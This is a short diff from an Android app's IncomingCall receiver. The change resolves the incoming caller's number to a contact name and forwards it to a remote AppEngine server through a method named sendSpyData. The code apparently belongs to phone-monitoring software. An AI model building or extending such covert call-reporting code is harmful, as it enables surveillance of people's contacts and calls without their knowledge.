@@ -14,7 +14,7 @@ public class IncomingCall extends BroadcastReceiver
 {
 
     @Override
-    public void onReceive(Context context, Intent intent) 
+    public void onReceive(final Context context, Intent intent) 
     {
             final Bundle bundle = intent.getExtras();
             
@@ -40,14 +40,13 @@ public class IncomingCall extends BroadcastReceiver
             			{
             				String phonenumber = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
             				
-                    		//SharedPreferences.Editor prefsEdit = prefs.edit();
-                    		//String contactName = ContactsUtility.getPhoneNumber(getContentResolver(), phonenumber);
+                    		String contact = ContactsUtility.getPhoneNumber(context.getContentResolver(), phonenumber);
                     		String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
                             AppEngineClient client = new AppEngineClient(devID);
                             
-                            Log.i(SetupActivity.TAG,"Incoming #: " + phonenumber);
+                            Log.i(SetupActivity.TAG,"Incoming #: " + contact);
                             
-                            String title = "Incoming Call from " + phonenumber;
+                            String title = "Incoming Call from " + contact;
                             String body = "";
                             String date = "";
             				client.sendSpyData(title, body, date);
